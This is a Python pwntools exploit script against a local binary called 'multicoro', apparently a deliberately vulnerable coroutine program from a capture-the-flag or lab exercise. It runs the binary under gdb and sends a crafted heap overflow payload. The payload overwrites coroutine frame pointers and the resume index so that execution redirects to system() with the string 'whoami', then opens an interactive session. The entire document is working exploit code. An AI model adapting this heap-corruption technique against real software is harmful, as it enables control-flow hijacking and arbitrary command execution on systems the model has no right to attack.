from pwn import *

context.update(arch='x86_64', os='linux')
binary = ELF('./multicoro')
context.binary = binary
#context.terminal = ['bash', '-e']
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = gdb.debug('./multicoro', '''
    b main
    b resume
    b destroy
    c        
''')

CORO_RESUME_CODE_PTR = 0x000055555555579e
CORO_DESTROY_CODE_PTR = 0x0000555555555b3c
SELF_FRAME_PTR_1 = 0x55555556bed0
SELF_FRAME_PTR_2 = 0x55555556bf60
SELF_FRAME_PTR_3 = 0x55555556bfb0
SELF_FRAME_PTR_4 = 0x55555556c000
VARS_PARAMS_RESUME_INDEX = 0x0000000000010004
SYSTEM_CALL_PTR = 0x555555555150
SYSTEM_CALL_ARG1 = 0x696d616f6877

p.recvuntil("Reading user input into insecure buffer (10 bytes)\n")
#Overflowing the heap
heap_payload_1 = b'A'*32
heap_payload_2 = pack(CORO_RESUME_CODE_PTR) + pack(CORO_RESUME_CODE_PTR) + \
    p64(0) + pack(SELF_FRAME_PTR_1) + \
    pack(VARS_PARAMS_RESUME_INDEX) + p64(0)*2 +\
    pack(SELF_FRAME_PTR_2) + \
    p64(0) + pack(0xf0f1)
heap_payload_3 = pack(CORO_RESUME_CODE_PTR) + pack(CORO_RESUME_CODE_PTR) + \
    p64(0) + pack(SELF_FRAME_PTR_2) + \
    pack(VARS_PARAMS_RESUME_INDEX) + p64(0)*2 +\
    pack(SELF_FRAME_PTR_3) + \
    p64(0) + pack(0xf0f1)
heap_payload_4 = pack(CORO_RESUME_CODE_PTR) + pack(CORO_RESUME_CODE_PTR) + \
    p64(0) + pack(SELF_FRAME_PTR_3) + \
    pack(VARS_PARAMS_RESUME_INDEX) + p64(0)*2 +\
    pack(SELF_FRAME_PTR_4) + \
    p64(0) + pack(0xf0f1)
heap_payload_5 = pack(SYSTEM_CALL_ARG1) + pack(SYSTEM_CALL_PTR)

heap_payload = heap_payload_1 + heap_payload_2 + b'B'*64 + heap_payload_3 + heap_payload_4 + heap_payload_5
p.send(heap_payload)

#output = p.recvline(timeout=3)
#print(output)

log.info("Payload length: "+ str(len(heap_payload)))
p.interactive()